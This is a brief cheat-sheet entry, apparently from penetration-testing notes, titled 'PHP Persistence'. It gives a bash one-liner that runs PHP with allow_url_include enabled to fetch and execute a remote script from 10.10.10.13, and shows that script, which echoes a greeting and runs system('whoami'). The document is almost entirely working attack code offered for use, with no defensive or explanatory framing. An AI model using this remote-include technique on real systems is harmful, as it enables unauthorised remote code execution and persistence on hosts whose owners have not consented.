## PHP Persistence
Run the following
```bash
php -d allow_url_include=1 -r 'include_once("http://10.10.10.13/hw.php")'
```


`hw.php` Contents
```php
<?php echo("Hello World\n"); ?>
<?php system('whoami'); ?>
```